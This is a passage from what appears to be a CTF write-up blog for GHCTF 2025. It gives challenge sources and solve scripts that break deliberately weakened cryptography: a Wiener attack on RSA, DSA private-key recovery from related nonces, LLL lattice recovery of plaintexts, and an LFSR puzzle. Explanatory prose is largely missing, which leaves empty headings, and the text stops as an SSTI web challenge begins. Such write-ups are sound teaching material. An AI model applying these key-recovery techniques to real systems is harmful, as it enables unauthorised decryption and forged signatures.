class="number">13</span> + <span class="number">3</span>*x^<span class="number">12</span> + x^<span class="number">11</span>*y + x^<span class="number">10</span>*y^<span class="number">2</span> + x^<span class="number">9</span>*y^<span class="number">3</span> + x^<span class="number">8</span>*y^<span class="number">4</span> - x^<span class="number">6</span>*y^<span class="number">6</span> - x^<span class="number">5</span>*y^<span class="number">7</span> - <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">9</span> - x^<span class="number">2</span>*y^<span class="number">10</span> - <span class="number">3</span>*x*y^<span class="number">11</span> - <span class="number">2</span>*y^<span class="number">12</span> + x^<span class="number">10</span>*y + <span class="number">5</span>*x^<span class="number">9</span>*y^<span class="number">2</span> + x^<span class="number">8</span>*y^<span class="number">3</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">6</span> + x^<span class="number">4</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">9</span> + <span class="number">2</span>*x*y^<span class="number">10</span> + <span class="number">3</span>*y^<span class="number">11</span> - x^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">9</span>*y - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">3</span> - x^<span class="number">6</span>*y^<span class="number">4</span> + x^<span class="number">5</span>*y^<span class="number">5</span> + <span class="number">3</span>*x^<span class="number">4</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">8</span> - x*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">8</span>*y - <span class="number">3</span>*x^<span class="number">6</span>*y^<span class="number">3</span> + x^<span class="number">5</span>*y^<span class="number">4</span> - x^<span class="number">4</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">7</span> + x*y^<span class="number">8</span> + <span class="number">4</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - x^<span class="number">7</span>*y - <span class="number">2</span>*x^<span class="number">5</span>*y^<span class="number">3</span> - <span class="number">4</span>*x^<span class="number">4</span>*y^<span class="number">4</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">5</span> + <span class="number">4</span>*x^<span class="number">2</span>*y^<span class="number">6</span> + <span class="number">2</span>*x*y^<span class="number">7</span> - <span class="number">2</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">2</span> + <span class="number">3</span>*x^<span class="number">2</span>*y^<span class="number">5</span> - x*y^<span class="number">6</span> - <span class="number">4</span>*x^<span class="number">6</span> + <span class="number">6</span>*x^<span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">4</span> - <span class="number">2</span>*x*y^<span class="number">5</span> - <span class="number">3</span>*y^<span class="number">6</span> + x^<span class="number">5</span> - <span class="number">3</span>*x^<span class="number">4</span>*y + x^<span class="number">3</span>*y^<span class="number">2</span> + x^<span class="number">2</span>*y^<span class="number">3</span> - <span class="number">2</span>*x*y^<span class="number">4</span> + <span class="number">2</span>*x^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">3</span>*y + <span class="number">6</span>*x^<span class="number">2</span>*y^<span class="number">2</span> - <span class="number">3</span>*x*y^<span class="number">3</span> - <span class="number">2</span>*y^<span class="number">4</span> - <span class="number">5</span>*x^<span class="number">3</span> - <span class="number">2</span>*x^<span class="number">2</span>*y - <span class="number">2</span>*x*y^<span class="number">2</span> + <span class="number">3</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">2</span> - x*y + y^<span class="number">2</span> - <span class="number">2</span>*x + <span class="number">2</span>*y - <span class="number">2</span></span><br><span class="line">w = <span class="number">12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line">c = <span class="number">10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line">need = [(-term[<span class="number">0</span>], term[<span class="number">1</span>].degree()) <span class="keyword">for</span> term <span class="keyword">in</span> f%(x-<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">sumpow = [<span class="number">4</span>] <span class="comment"># sumpow[i] = pow(2,p**i+q**i,n)</span></span><br><span class="line">sumpow.append(<span class="built_in">pow</span>(<span class="number">2</span>,n+<span class="number">1</span>,n)) <span class="comment"># (p*q + 1)%(p*q - p - q + 1) == p + q</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">32</span>):</span><br><span class="line">    sumpow.append(<span class="built_in">pow</span>(sumpow[i-<span class="number">1</span>],n+<span class="number">1</span>,n) * <span class="built_in">pow</span>(sumpow[i-<span class="number">2</span>],-n,n))</span><br><span class="line">    sumpow[-<span class="number">1</span>] %= n</span><br><span class="line">    <span class="comment"># p**i + q**i = (p + q)(p**(i-1) + q**(i-1)) - (p*q)(p**(i-2) + q**(i-2))</span></span><br><span class="line"></span><br><span class="line">f2 = f</span><br><span class="line">w2 = w</span><br><span class="line"><span class="keyword">for</span> coeff, deg <span class="keyword">in</span> need:</span><br><span class="line">    w2 *= <span class="built_in">pow</span>(sumpow[deg],coeff,n)</span><br><span class="line">    w2 %= n</span><br><span class="line">    f2 += coeff*(x**deg + y**deg)</span><br><span class="line"></span><br><span class="line">p = gcd(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f2%(x-<span class="number">1</span>)),n) * <span class="built_in">pow</span>(w2,-<span class="number">1</span>,n) - <span class="number">1</span>, n)</span><br><span class="line">prefix = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">length = <span class="number">88</span> - <span class="built_in">len</span>(prefix) - <span class="built_in">len</span>(suffix)</span><br><span class="line"></span><br><span class="line">c -= <span class="number">256</span>^(<span class="built_in">len</span>(suffix) + length) * bytes_to_long(prefix)</span><br><span class="line">c -= bytes_to_long(suffix)</span><br><span class="line">c = c * inverse(<span class="number">256</span>,p) % p</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^i</span><br><span class="line">    c -= <span class="number">256</span>^i*<span class="number">48</span></span><br><span class="line"></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">4</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">L[:,-<span class="number">1</span>:] *= <span class="number">2</span>^<span class="number">512</span></span><br><span class="line">res = L.LLL()</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(i[-<span class="number">2</span>]) == <span class="number">4</span> <span class="keyword">and</span> <span class="built_in">all</span>(<span class="built_in">abs</span>(j) &lt; <span class="number">10</span> <span class="keyword">for</span> j <span class="keyword">in</span> i)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="number">48</span> + <span class="built_in">abs</span>(j))</span><br><span class="line">flag = prefix+flag.encode()+suffix</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="rsa_and_dsa"><a class="markdownIt-Anchor" href="#rsa_and_dsa"></a> RSA_and_DSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">ink=getPrime(<span class="number">20</span>)</span><br><span class="line">p1= getPrime(<span class="number">512</span>)</span><br><span class="line">q1= getPrime(<span class="number">512</span>)</span><br><span class="line">N = p1* q1</span><br><span class="line">phi = (p1-<span class="number">1</span>) * (q1-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d1= getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d1, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d1, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">c_ink = <span class="built_in">pow</span>(ink, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_ink=&#x27;</span>,c_ink)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e=&#x27;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N=&#x27;</span>,N)</span><br><span class="line"></span><br><span class="line">k= getPrime(<span class="number">64</span>)</span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * gmpy2.invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    temp = q * getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(temp + <span class="number">1</span>):</span><br><span class="line">        p = temp + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h, (p - <span class="number">1</span>) // q, p)</span><br><span class="line">y = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r1,s1)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;(r2,s2)=&quot;</span>,sign(<span class="string">b&#x27;GHCTF-2025&#x27;</span>, pub, pri, k+ink))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p= &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y= &#125;</span>&quot;</span>)</span><br><span class="line">key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">ciphertext = cipher.encrypt(pad(flag.encode(), <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c_ink= 75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line"><span class="string">e= 97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line"><span class="string">N= 131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line"><span class="string">(r1,s1)= (116607429176396769010327954525649019081679807573, 242024511677350537268048640408155954695100314686)</span></span><br><span class="line"><span class="string">(r2,s2)= (282969697665204582571637561594660002955972273916, 233488943967710383661411268886726155900968304282)</span></span><br><span class="line"><span class="string">g= 113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line"><span class="string">q= 1010682595723348988315901923086844563134854720501</span></span><br><span class="line"><span class="string">p= 117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line"><span class="string">y= 114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line"><span class="string">ciphertext = b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong></strong></p><p><strong>DSA</strong><strong>CTF</strong><strong>k(k2=k1^2)<strong></strong>k(k2=k1+ink)</strong><a href="http://www.cynthia99.link/index.php/archives/2426/"></a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(<span class="string">b&#x27;GHCTF-2025&#x27;</span>).digest().<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">c_ink = <span class="number">75517502692097831363443739147565176367247985201143975453326891807623085586665800338505194812511215986799510259417486636115714543892322380908775898968005967267154089356401466517827082639942650711458196552847137272733225451581167527549711435805194039361007506436462393605949663173972848316802086005675594122447</span></span><br><span class="line">e = <span class="number">97127528017076464922170978933159739328499830874876612140194720448608536284451056980759925228574802703400503852897647806707933102198339936307176078592550748707182506634151382952065240918923594664309561466538540752851827183955776181255541306419282376724578231110985180090748520497985751591062886932254909959583</span></span><br><span class="line">N = <span class="number">131342286566556880877092331187418465653855813425966929864425381510875531237549624989644814104311810243468058174748867544024292263674725375273146689145421426693384862215460097683187892351130513429928063652701077721570140977719823754701988835199434602294597102748436781125528389125846980183998136743830655746063</span></span><br><span class="line">(r1, s1) = (<span class="number">116607429176396769010327954525649019081679807573</span>,</span><br><span class="line">            <span class="number">242024511677350537268048640408155954695100314686</span>)</span><br><span class="line">(r2, s2) = (<span class="number">282969697665204582571637561594660002955972273916</span>,</span><br><span class="line">            <span class="number">233488943967710383661411268886726155900968304282</span>)</span><br><span class="line">g = <span class="number">113752591438136097752416877421595518178059067044406008965947486693591255247711343925741016027611310257564826355221058212913879375956265361413159461801130112690842862767232535007802294944943540511148985219047761964228666223605898858379133610079745082176804146052086680551043775640630819062323009071190616231206</span></span><br><span class="line">q = <span class="number">1010682595723348988315901923086844563134854720501</span></span><br><span class="line">p = <span class="number">117574623402990360322255542120443410701206393780334500865748478770699335257408652117586356058603035930256320433146236288486738066821845146885689024168044244453298677322763816219621376364185484753693835156465778487436550070788009331605135011517651578548403565196930955818239577581944709384126001757349228062611</span></span><br><span class="line">y = <span class="number">114719310327856435690312712426667059528255758467780345974417610618467568889317865434557927492426543544900066735337367408842750916882737134575812646864528120528284507025781167314123831868039617392195979751697057669675359335622753482920688147222344801914086866640706838774098397923450797553056502975678740968481</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x10\xbcL|\xcb\xe5W\x1e0\xa3\x83\x85vr^SmU\xac\xe3L\x93&quot;#\xb4\x81\xd0\xf0S\x05\xb7\xc7&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span>  <span class="comment"># </span></span><br><span class="line">    denominator = <span class="number">1</span>  <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    res = []</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> d.bit_length() == <span class="number">200</span>:</span><br><span class="line">            res.append(d)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = wienerAttack(e, N)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    ink = <span class="built_in">pow</span>(c_ink, i, N)</span><br><span class="line">    k = (h*r2 - h*r1 + ink*s2*r1) * inverse(s1*r2 - s2*r1, q) % q</span><br><span class="line">    pri = (k*s1 - h) * inverse(r1, q) % q</span><br><span class="line">    key = hashlib.sha1(<span class="built_in">str</span>(pri).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="sin"><a class="markdownIt-Anchor" href="#sin"></a> Sin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="built_in">print</span>((<span class="number">2</span> * sin((m := bytes_to_long(<span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span>))) - <span class="number">2</span> * sin(m) * cos(<span class="number">2</span> * m)).n(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mflag</span></span><br><span class="line"><span class="string">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/">SHCTF2024-week3-</a><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mi>s</mi><mi>i</mi><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">4sin^{3}(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></p><p><code>flag</code>(<code>SH</code>)<code>flag</code><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line">leak = (leak / <span class="number">4</span>)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">asin = arcsin(leak)</span><br><span class="line">RF = RealField(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># RealFieldRF53</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = i*<span class="number">8</span></span><br><span class="line">    k0 = k*<span class="number">2</span></span><br><span class="line">    M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^k0],[<span class="number">0</span>,<span class="number">2</span>^k,<span class="number">2</span>^k0*asin],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^k0*<span class="number">2</span>*pi]])</span><br><span class="line">    m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="river"><a class="markdownIt-Anchor" href="#river"></a> river()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, seed, mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_"></span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask, lfsr=<span class="literal">None</span></span>):</span><br><span class="line">        self.state = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;seed:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.mask_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;mask:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.n = n</span><br><span class="line">        self.lfsr = lfsr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">sum</span>([self.state[i] * self.mask_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n)]) &amp; <span class="number">1</span></span><br><span class="line">        self.state = self.state[<span class="number">1</span>:] + [s]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.lfsr:</span><br><span class="line">            <span class="keyword">if</span> self.lfsr():</span><br><span class="line">                self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_"></span>(<span class="title class_ inherited__"></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(n, seed, mask, lfsr=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="keyword">assert</span> seed.bit_length == mask.bit_length == n</span><br><span class="line">lfsr1 = (n, seed, mask)</span><br><span class="line">lfsr2 = (n, seed, mask, lfsr1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mask = <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;output = <span class="subst">&#123;<span class="built_in">sum</span>(lfsr2() &lt;&lt; (n - <span class="number">1</span> - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># mask = 9494051593829874780</span></span><br><span class="line"><span class="comment"># output = 13799267741689921474</span></span><br><span class="line"><span class="comment"># enc = b&#x27;\x03\xd1#\xb9\xaa5\xff3y\xba\xcb\x91`\x9d4p~9r\xf6i\r\xca\x03dW\xdb\x9a\xd2\xa6\xc6\x85\xfa\x19=b\xb2)5&gt;]\x05,\xeb\xa0\x12\xa9\x1e&#x27; </span></span><br></pre></td></tr></table></figure><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><strong>CsomeCINTASagemathblog()</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="uploadssti"><a class="markdownIt-Anchor" href="#uploadssti"></a> upload?SSTI!</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/uploads&#x27;</span>  <span class="comment"># </span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">MAX_CONTENT_LENGTH = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment">#  16MB</span></span><br><span class="line"></span><br><span class="line">app.config[<span 